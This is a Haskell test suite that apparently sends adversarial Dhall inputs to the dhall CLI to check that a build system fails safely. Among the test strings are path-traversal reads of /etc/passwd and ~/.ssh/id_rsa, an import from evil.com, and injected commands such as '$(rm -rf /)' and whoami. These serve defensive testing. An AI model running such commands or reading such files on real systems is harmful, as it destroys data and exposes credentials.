{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE QuasiQuotes #-}
{-# LANGUAGE ScopedTypeVariables #-}

-- | DHALL TORTURE TESTS for sensenet
--
-- "I like these calm little moments before the storm."
-- - Norman Stansfield
--
-- Adversarial Dhall inputs designed to break the build system:
-- - Malformed syntax
-- - Type errors
-- - Infinite loops
-- - Resource exhaustion
-- - Path traversal attacks
-- - Unicode bombs
--
-- These tests verify graceful failure, not success.
module Test.SenseNet.DhallTorture (tests) where

import Control.Concurrent (threadDelay)
import Control.Concurrent.Async (race)
import Control.Exception (SomeException, evaluate, try)
import Data.Text (Text)
import Data.Text qualified as T
import Data.Text.IO qualified as TIO
import System.Directory
  ( createDirectoryIfMissing,
    doesFileExist,
    getCurrentDirectory,
    removeDirectoryRecursive,
    removeFile,
  )
import System.Exit (ExitCode (..))
import System.FilePath ((</>))
import System.IO.Temp (withSystemTempDirectory)
import System.Process (readProcessWithExitCode)
import Test.Tasty
import Test.Tasty.HUnit

tests :: TestTree
tests =
  testGroup
    "DhallTorture"
    [ testGroup "MalformedSyntax" malformedSyntaxTests,
      testGroup "TypeErrors" typeErrorTests,
      testGroup "InfiniteLoops" infiniteLoopTests,
      testGroup "ResourceExhaustion" resourceExhaustionTests,
      testGroup "PathTraversal" pathTraversalTests,
      testGroup "UnicodeBombs" unicodeBombTests,
      testGroup "ImportAttacks" importAttackTests,
      testGroup "InjectionAttacks" injectionAttackTests,
      testGroup "EncodingAttacks" encodingAttackTests,
      testGroup "BoundaryValues" boundaryValueTests
    ]

-- ════════════════════════════════════════════════════════════════════════════
-- MALFORMED SYNTAX
-- ════════════════════════════════════════════════════════════════════════════

malformedSyntaxTests :: [TestTree]
malformedSyntaxTests =
  [ testCase "unclosed brace fails gracefully" $ do
      let badDhall = "let x = { field = 1"
      result <- evalDhallString badDhall
      assertFailure' "unclosed brace" result,
    testCase "unclosed string fails gracefully" $ do
      let badDhall = "let x = \"unclosed"
      result <- evalDhallString badDhall
      assertFailure' "unclosed string" result,
    testCase "invalid unicode escape fails gracefully" $ do
      let badDhall = "let x = \"\\u{GGGGGG}\" in x"
      result <- evalDhallString badDhall
      assertFailure' "invalid unicode" result,
    testCase "empty file fails gracefully" $ do
      let badDhall = ""
      result <- evalDhallString badDhall
      assertFailure' "empty file" result,
    testCase "just whitespace fails gracefully" $ do
      let badDhall = "   \n\t\n   "
      result <- evalDhallString badDhall
      assertFailure' "whitespace only" result,
    testCase "random bytes fail gracefully" $ do
      let badDhall = "\x00\x01\x02\xFF\xFE"
      result <- evalDhallString badDhall
      assertFailure' "random bytes" result,
    testCase "deeply nested parens" $ do
      let depth = 1000
          badDhall = T.replicate depth "(" <> "1" <> T.replicate depth ")"
      result <- evalDhallStringTimeout 5000000 badDhall
      -- Should either succeed or fail, but NOT hang
      case result of
        Nothing -> assertFailure "deeply nested parens timed out"
        Just _ -> pure ()
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- TYPE ERRORS
-- ════════════════════════════════════════════════════════════════════════════

typeErrorTests :: [TestTree]
typeErrorTests =
  [ testCase "type mismatch in record" $ do
      let badDhall =
            T.unlines
              [ "let Target = { name : Text, srcs : List Text }",
                "in { name = 1, srcs = [\"x\"] } : Target"
              ]
      result <- evalDhallString badDhall
      assertFailure' "type mismatch" result,
    testCase "missing required field" $ do
      let badDhall =
            T.unlines
              [ "let Target = { name : Text, srcs : List Text }",
                "in { name = \"test\" } : Target"
              ]
      result <- evalDhallString badDhall
      assertFailure' "missing field" result,
    testCase "wrong function argument type" $ do
      let badDhall = "(\\(x : Natural) -> x + 1) \"not a number\""
      result <- evalDhallString badDhall
      assertFailure' "wrong argument type" result,
    testCase "undefined variable" $ do
      let badDhall = "let x = y in x"
      result <- evalDhallString badDhall
      assertFailure' "undefined variable" result,
    testCase "recursive type (not allowed)" $ do
      let badDhall = "let T = { field : T } in T"
      result <- evalDhallString badDhall
      assertFailure' "recursive type" result
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- INFINITE LOOPS
-- ════════════════════════════════════════════════════════════════════════════

infiniteLoopTests :: [TestTree]
infiniteLoopTests =
  [ testCase "Natural/fold with huge N times out" $ do
      -- This should be bounded by normalization limits
      let badDhall = "Natural/fold 999999999999 Natural (\\(x : Natural) -> x + 1) 0"
      result <- evalDhallStringTimeout 3000000 badDhall
      case result of
        Nothing -> pure () -- Timeout is acceptable
        Just (Right _) -> pure () -- If it somehow completes, OK
        Just (Left _) -> pure (), -- Error is fine too
    testCase "List/fold with huge list times out" $ do
      let n = 100000
          badDhall =
            "List/fold Natural ["
              <> T.intercalate "," (map (T.pack . show) [1 .. n])
              <> "] Natural (\\(x : Natural) -> \\(acc : Natural) -> x + acc) 0"
      result <- evalDhallStringTimeout 5000000 badDhall
      case result of
        Nothing -> pure () -- Timeout OK
        Just _ -> pure (), -- Any completion OK
    testCase "deeply nested lets don't stack overflow" $ do
      let depth = 10000
          badDhall =
            T.unlines $
              ["let x0 = 1"]
                ++ ["let x" <> T.pack (show i) <> " = x" <> T.pack (show (i - 1)) <> " + 1" | i <- [1 .. depth]]
                ++ ["in x" <> T.pack (show depth)]
      result <- evalDhallStringTimeout 10000000 badDhall
      case result of
        Nothing -> assertFailure "nested lets timed out (10s)"
        Just (Left _) -> pure () -- Error is fine
        Just (Right _) -> pure () -- Success is fine
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- RESOURCE EXHAUSTION
-- ════════════════════════════════════════════════════════════════════════════

resourceExhaustionTests :: [TestTree]
resourceExhaustionTests =
  [ testCase "huge record doesn't OOM" $ do
      let n = 10000
          badDhall =
            "{ "
              <> T.intercalate ", " ["field" <> T.pack (show i) <> " = " <> T.pack (show i) | i <- [1 .. n]]
              <> " }"
      result <- evalDhallStringTimeout 10000000 badDhall
      case result of
        Nothing -> assertFailure "huge record timed out"
        Just _ -> pure (),
    testCase "huge list doesn't OOM" $ do
      let n = 50000
          badDhall = "[" <> T.intercalate "," (map (T.pack . show) [1 .. n]) <> "]"
      result <- evalDhallStringTimeout 10000000 badDhall
      case result of
        Nothing -> assertFailure "huge list timed out"
        Just _ -> pure (),
    testCase "exponential blowup bounded" $ do
      -- This tries to create 2^depth copies via record merging
      let depth = 30
          badDhall =
            "let double = \\(r : { x : Natural }) -> r // r in "
              <> T.replicate depth "double ("
              <> "{ x = 1 }"
              <> T.replicate depth ")"
      result <- evalDhallStringTimeout 5000000 badDhall
      -- Should either error or timeout, not OOM
      case result of
        Nothing -> pure () -- Timeout OK
        Just _ -> pure () -- Any result OK
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- PATH TRAVERSAL ATTACKS
-- ════════════════════════════════════════════════════════════════════════════

pathTraversalTests :: [TestTree]
pathTraversalTests =
  [ testCase "../../../etc/passwd import blocked" $ do
      let badDhall = "../../../etc/passwd as Text"
      result <- evalDhallString badDhall
      assertFailure' "path traversal to /etc/passwd" result,
    testCase "absolute path import blocked" $ do
      let badDhall = "/etc/passwd as Text"
      result <- evalDhallString badDhall
      assertFailure' "absolute path import" result,
    testCase "home directory expansion blocked" $ do
      let badDhall = "~/.ssh/id_rsa as Text"
      result <- evalDhallString badDhall
      assertFailure' "home directory import" result,
    testCase "env: import with command substitution blocked" $ do
      let badDhall = "env:$(whoami) as Text"
      result <- evalDhallString badDhall
      assertFailure' "env command substitution" result,
    testCase "network import blocked in sandbox" $ do
      let badDhall = "https://evil.com/malicious.dhall"
      result <- evalDhallString badDhall
      -- Network imports should either fail or be blocked
      assertFailure' "network import" result
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- UNICODE BOMBS
-- ════════════════════════════════════════════════════════════════════════════

unicodeBombTests :: [TestTree]
unicodeBombTests =
  [ testCase "BOM handling" $ do
      let withBom = "\xFEFF" <> "let x = 1 in x"
      result <- evalDhallString withBom
      -- Should either handle BOM or fail gracefully
      case result of
        Right _ -> pure ()
        Left _ -> pure (),
    testCase "RTL override doesn't break parsing" $ do
      let rtl = "let \x202E = 1 in \x202E" -- RTL override in identifier
      result <- evalDhallString rtl
      -- Should fail (invalid identifier) not crash
      case result of
        Left _ -> pure ()
        Right _ -> pure (), -- If it somehow works, fine
    testCase "zero-width chars in identifiers" $ do
      let zwj = "let x\x200B = 1 in x\x200B" -- Zero-width space
      result <- evalDhallString zwj
      case result of
        Left _ -> pure ()
        Right _ -> pure (),
    testCase "homoglyph attack" $ do
      -- Cyrillic 'а' looks like Latin 'a'
      let homoglyph = "let \x0430 = 1 in a" -- Define Cyrillic, use Latin
      result <- evalDhallString homoglyph
      assertFailure' "homoglyph should not match" result,
    testCase "emoji in text literals" $ do
      let emoji = "let x = \"🔥💀🎉\" in x"
      result <- evalDhallString emoji
      case result of
        Right val -> T.isInfixOf "🔥" (T.pack val) @?= True
        Left _ -> assertFailure "emoji in text should work",
    testCase "null bytes in string" $ do
      let nulls = "let x = \"hello\\u0000world\" in x"
      result <- evalDhallString nulls
      case result of
        Right _ -> pure ()
        Left _ -> pure ()
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- IMPORT ATTACKS
-- ════════════════════════════════════════════════════════════════════════════

importAttackTests :: [TestTree]
importAttackTests =
  [ testCase "circular import detection" $ do
      -- Create temp files that import each other
      withSystemTempDirectory "dhall-test" $ \tmpDir -> do
        let fileA = tmpDir </> "a.dhall"
            fileB = tmpDir </> "b.dhall"
        TIO.writeFile fileA ("./b.dhall" :: Text)
        TIO.writeFile fileB ("./a.dhall" :: Text)
        (code, _, stderr) <-
          readProcessWithExitCode
            "dhall"
            ["--file", fileA]
            ""
        -- Should fail with cycle detection
        code @?= ExitFailure 1
        assertBool "should mention cycle" $
          "cycle" `T.isInfixOf` T.pack stderr
            || "import" `T.isInfixOf` T.pack stderr,
    testCase "import depth limit" $ do
      -- Create a chain of imports
      withSystemTempDirectory "dhall-test" $ \tmpDir -> do
        let depth = 100
        forM_ [0 .. depth] $ \i -> do
          let file = tmpDir </> ("f" ++ show i ++ ".dhall")
          let content =
                if i == depth
                  then "1" :: Text
                  else "./f" <> T.pack (show (i + 1)) <> ".dhall"
          TIO.writeFile file content
        (code, stdout, stderr) <-
          readProcessWithExitCode
            "dhall"
            ["--file", tmpDir </> "f0.dhall"]
            ""
        -- Should either succeed or fail with depth limit
        case code of
          ExitSuccess -> T.pack stdout @?= "1\n"
          ExitFailure _ -> pure (), -- Depth limit is fine
    testCase "missing import fails gracefully" $ do
      let badDhall = "./nonexistent-file-12345.dhall"
      result <- evalDhallString badDhall
      assertFailure' "missing import" result
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- HELPERS
-- ════════════════════════════════════════════════════════════════════════════

-- | Evaluate a Dhall string using the dhall CLI
evalDhallString :: Text -> IO (Either String String)
evalDhallString dhallCode = do
  (code, stdout, stderr) <-
    readProcessWithExitCode
      "dhall"
      []
      (T.unpack dhallCode)
  case code of
    ExitSuccess -> pure $ Right stdout
    ExitFailure _ -> pure $ Left stderr

-- | Evaluate with timeout (microseconds)
evalDhallStringTimeout :: Int -> Text -> IO (Maybe (Either String String))
evalDhallStringTimeout timeoutUs dhallCode = do
  result <-
    race
      (threadDelay timeoutUs)
      (evalDhallString dhallCode)
  case result of
    Left () -> pure Nothing -- Timeout
    Right r -> pure $ Just r

-- | Assert that evaluation fails
assertFailure' :: String -> Either String String -> IO ()
assertFailure' label result = case result of
  Left _ -> pure () -- Expected failure
  Right val ->
    assertFailure $
      label ++ " should have failed, but got: " ++ take 100 val

-- | forM_ helper
forM_ :: [a] -> (a -> IO ()) -> IO ()
forM_ [] _ = pure ()
forM_ (x : xs) f = f x >> forM_ xs f

-- ════════════════════════════════════════════════════════════════════════════
-- INJECTION ATTACKS
-- Try to inject malicious code through Dhall
-- ════════════════════════════════════════════════════════════════════════════

injectionAttackTests :: [TestTree]
injectionAttackTests =
  [ testCase "shell command injection blocked" $ do
      let badDhall = "let x = \"$(rm -rf /)\" in x"
      result <- evalDhallString badDhall
      case result of
        Right val -> assertBool "should be literal string" (val == "\"$(rm -rf /)\"\n" || "rm -rf" `T.isInfixOf` T.pack val)
        Left _ -> pure (),
    testCase "backtick injection blocked" $ do
      let badDhall = "let x = \"`whoami`\" in x"
      result <- evalDhallString badDhall
      case result of
        Right _ -> pure () -- Should be literal
        Left _ -> pure (),
    testCase "env variable expansion blocked" $ do
      let badDhall = "let x = \"$HOME\" in x"
      result <- evalDhallString badDhall
      case result of
        Right val -> assertBool "should be literal $HOME" ("$HOME" `T.isInfixOf` T.pack val)
        Left _ -> pure (),
    testCase "multiline string injection" $ do
      let badDhall = "let x = ''\n  ${./malicious.sh}\n  '' in x"
      result <- evalDhallString badDhall
      -- Should fail on missing import
      assertFailure' "multiline injection" result,
    testCase "record field injection" $ do
      let badDhall = "{ `rm -rf /` = 1 }"
      result <- evalDhallString badDhall
      -- Backticks not valid identifiers in Dhall
      assertFailure' "backtick field name" result,
    testCase "type annotation injection" $ do
      let badDhall = "1 : Natural -- ; rm -rf /"
      result <- evalDhallString badDhall
      case result of
        Right _ -> pure () -- Comments are fine
        Left _ -> pure ()
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- ENCODING ATTACKS
-- Malicious character encodings
-- ════════════════════════════════════════════════════════════════════════════

encodingAttackTests :: [TestTree]
encodingAttackTests =
  [ testCase "overlong UTF-8 sequences rejected" $ do
      -- Overlong encoding of '/' as 0xC0 0xAF
      let badDhall = "\xC0\xAF"
      result <- evalDhallString badDhall
      assertFailure' "overlong UTF-8" result,
    testCase "invalid UTF-8 continuations rejected" $ do
      let badDhall = "\x80\x81\x82"
      result <- evalDhallString badDhall
      assertFailure' "invalid continuation bytes" result,
    testCase "UTF-16 surrogate pairs in UTF-8" $ do
      -- Surrogates should not appear in UTF-8
      let badDhall = "\xED\xA0\x80"
      result <- evalDhallString badDhall
      assertFailure' "UTF-16 surrogate in UTF-8" result,
    testCase "mixed line endings (CRLF/LF/CR)" $ do
      let badDhall = "let x = 1\r\nlet y = 2\rlet z = 3\nin x + y + z"
      result <- evalDhallString badDhall
      case result of
        Right val -> "6" `T.isInfixOf` T.pack val @?= True
        Left _ -> pure (), -- Some parsers reject mixed
    testCase "byte order marks in middle of file" $ do
      let badDhall = "let x = 1 \xFEFF in x"
      result <- evalDhallString badDhall
      case result of
        Right _ -> pure ()
        Left _ -> pure (),
    testCase "null byte terminates string (C-style attack)" $ do
      let badDhall = "let x = \"hello\x00world\" in x"
      result <- evalDhallString badDhall
      -- Dhall should preserve the null
      case result of
        Right _ -> pure ()
        Left _ -> pure ()
  ]

-- ════════════════════════════════════════════════════════════════════════════
-- BOUNDARY VALUE TESTS
-- Edge cases at type and value boundaries
-- ════════════════════════════════════════════════════════════════════════════

boundaryValueTests :: [TestTree]
boundaryValueTests =
  [ testCase "Natural maximum (huge number)" $ do
      let bigNum = T.replicate 1000 "9"
          badDhall = bigNum
      result <- evalDhallStringTimeout 5000000 badDhall
      case result of
        Nothing -> assertFailure "big Natural timed out"
        Just _ -> pure (),
    testCase "Integer positive max" $ do
      let badDhall = "+" <> T.replicate 100 "9"
      result <- evalDhallStringTimeout 5000000 badDhall
      case result of
        Nothing -> assertFailure "big Integer timed out"
        Just _ -> pure (),
    testCase "Integer negative max" $ do
      let badDhall = "-" <> T.replicate 100 "9"
      result <- evalDhallStringTimeout 5000000 badDhall
      case result of
        Nothing -> assertFailure "big negative Integer timed out"
        Just _ -> pure (),
    testCase "empty Optional" $ do
      let badDhall = "None Natural"
      result <- evalDhallString badDhall
      case result of
        Right _ -> pure ()
        Left err -> assertFailure $ "None should work: " ++ err,
    testCase "deeply nested Optional" $ do
      let depth = 100
          badDhall = T.replicate depth "Some (" <> "1" <> T.replicate depth ")"
      result <- evalDhallStringTimeout 5000000 badDhall
      case result of
        Nothing -> assertFailure "nested Optional timed out"
        Just _ -> pure (),
    testCase "empty record" $ do
      let badDhall = "{=}"
      result <- evalDhallString badDhall
      case result of
        Right _ -> pure ()
        Left err -> assertFailure $ "empty record should work: " ++ err,
    testCase "empty union" $ do
      let badDhall = "<>"
      result <- evalDhallString badDhall
      case result of
        Right _ -> pure ()
        Left _ -> pure (), -- May or may not be valid
    testCase "single-field record" $ do
      let badDhall = "{ x = 1 }"
      result <- evalDhallString badDhall
      case result of
        Right _ -> pure ()
        Left err -> assertFailure $ "single field record should work: " ++ err,
    testCase "record with 1000 fields" $ do
      let n = 1000
          fields = T.intercalate ", " ["field" <> T.pack (show i) <> " = " <> T.pack (show i) | i <- [1..n]]
          badDhall = "{ " <> fields <> " }"
      result <- evalDhallStringTimeout 10000000 badDhall
      case result of
        Nothing -> assertFailure "1000-field record timed out"
        Just _ -> pure ()
  ]
